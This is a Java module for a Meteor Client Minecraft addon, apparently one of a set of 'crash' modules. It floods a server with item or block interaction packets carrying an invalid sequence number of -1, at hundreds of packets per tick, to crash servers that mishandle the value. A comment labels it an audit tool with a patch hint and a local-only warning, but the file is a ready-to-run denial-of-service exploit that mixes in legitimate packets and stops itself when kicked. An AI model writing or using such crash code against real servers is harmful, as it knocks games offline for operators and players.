package com.example.addon.modules.crash;

import com.example.addon.AddonTemplate;
import meteordevelopment.meteorclient.events.game.GameLeftEvent;
import meteordevelopment.meteorclient.events.packets.PacketEvent;
import meteordevelopment.meteorclient.events.world.TickEvent;
import meteordevelopment.meteorclient.settings.*;
import meteordevelopment.meteorclient.systems.modules.Module;
import meteordevelopment.orbit.EventHandler;
import net.minecraft.network.packet.c2s.play.PlayerInteractBlockC2SPacket;
import net.minecraft.network.packet.c2s.play.PlayerInteractItemC2SPacket;
import net.minecraft.util.Hand;
import net.minecraft.util.hit.BlockHitResult;
import net.minecraft.util.math.BlockPos;
import net.minecraft.util.math.Direction;
import net.minecraft.util.math.Vec3d;

/**
 * AUDIT: Sequence Crash (invalid sequence number −1 in interaction packets)
 *
 * Sends PlayerInteractItemC2SPacket and PlayerInteractBlockC2SPacket with
 * sequence number −1. The sequence number is a monotonically increasing
 * counter used for block-change acknowledgement; −1 is not a valid value and
 * is outside the expected [0, MAX_INT] range.
 *
 * On servers that cast the sequence number to a signed index or use it in
 * arithmetic without bounds-checking, −1 can trigger an array-out-of-bounds
 * exception, a modulo-by-zero path, or simply overflow a signed counter.
 * Paper 1.20.1 and earlier had handling that was vulnerable to certain
 * sequence-number values; this module confirms whether your server still is.
 *
 * Patch signal: clamp or reject sequence numbers outside [0, MAX_INT] at
 * decode time; treat the sequence as an opaque counter for ack tracking,
 * never as an array index or arithmetic operand without bounds checks.
 *
 * Run against your OWN local server only.
 */
public class SequenceCrash extends Module {
    public enum Mode { Item, Block }

    private final SettingGroup sgGeneral = settings.getDefaultGroup();

    private final Setting<Mode> mode = sgGeneral.add(new EnumSetting.Builder<Mode>()
        .name("mode").defaultValue(Mode.Block).build()
    );
    private final Setting<Integer> amount = sgGeneral.add(new IntSetting.Builder()
        .name("amount").description("Packets per tick.")
        .defaultValue(200).sliderRange(50, 2000).build()
    );

    private final TestCadence cadence = new TestCadence(sgGeneral);
    private final PreStress preStress = new PreStress(sgGeneral);
    private final GracefulResponse gr = new GracefulResponse(sgGeneral);

    private final Setting<Boolean> autoDisable = sgGeneral.add(new BoolSetting.Builder()
        .name("auto-disable").description("Disable when kicked from the server.")
        .defaultValue(true).build()
    );
    private final Setting<Boolean> showStats = sgGeneral.add(new BoolSetting.Builder()
        .name("show-stats").description("Print tick + packet count on deactivate.")
        .defaultValue(true).build()
    );

    private int ticksActive = 0, packetsSent = 0;

    public SequenceCrash() {
        super(AddonTemplate.CRASH_CATEGORY, "sequence-crash",
            "Sends interactions with an invalid sequence number (-1). Mainly affects non-Paper servers.");
    }

    @Override
    public void onActivate() {
        ticksActive = 0; packetsSent = 0;
        cadence.onActivate(); gr.onActivate(); preStress.onActivate(this);
    }

    @EventHandler
    private void onTick(TickEvent.Post event) {
        if (mc.player == null) return;
        ticksActive++;
        gr.tick();
        if (!cadence.shouldFire()) return;
        switch (mode.get()) {
            case Item -> {
                for (int i = 0; i < amount.get(); i++) {
                    mc.player.networkHandler.sendPacket(new PlayerInteractItemC2SPacket(Hand.MAIN_HAND, -1, 0f, 0f));
                    packetsSent++;
                }
            }
            case Block -> {
                Vec3d pos = new Vec3d(mc.player.getX(), mc.player.getY(), mc.player.getZ());
                BlockHitResult bhr = new BlockHitResult(pos, Direction.DOWN, BlockPos.ofFloored(pos), false);
                for (int i = 0; i < amount.get(); i++) {
                    mc.player.networkHandler.sendPacket(new PlayerInteractBlockC2SPacket(Hand.MAIN_HAND, bhr, -1));
                    packetsSent++;
                }
            }
        }
        gr.markFired();
        TestCadence.sendLegit(mc.player, cadence.legitRatio());
    }

    @Override
    public void onDeactivate() {
        if (showStats.get()) {
            info("Summary: %d ticks active, %d packets sent.", ticksActive, packetsSent);
            gr.report(l -> info("%s", l));
        }
        preStress.onDeactivate();
    }

    @EventHandler
    private void onReceivePacket(PacketEvent.Receive event) { gr.onReceive(event.packet); }

    @EventHandler
    private void onGameLeft(GameLeftEvent event) {
        gr.onKick();
        if (autoDisable.get() && isActive()) toggle();
    }
}
